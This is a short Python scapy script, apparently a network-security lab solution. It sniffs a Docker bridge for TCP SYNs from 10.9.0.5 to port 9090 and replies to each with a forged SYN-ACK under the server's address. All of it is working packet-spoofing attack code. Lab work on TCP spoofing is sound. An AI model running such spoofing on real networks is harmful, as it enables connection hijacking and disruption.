#!/bin/env python3

from scapy.all import *
#from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits


def syn_ack(response_pkt):
	if(response_pkt[TCP].flags == "S"):
		new_ip = IP(dst=response_pkt[IP].src)
		new_seq = getrandbits(32)
		new_tcp = TCP(dport=response_pkt[TCP].sport, flags='SA', seq=new_seq, ack=(response_pkt[TCP].seq+1))
		new_pkt = new_ip/new_tcp
		new_pkt[IP].src=response_pkt[IP].dst
		new_pkt[TCP].sport =response_pkt[TCP].dport
		
		send(new_pkt, verbose = 0)
	

response_pkt = sniff(iface='br-444c28130ffb', filter='src host 10.9.0.5 and tcp and dst port 9090', prn=syn_ack)
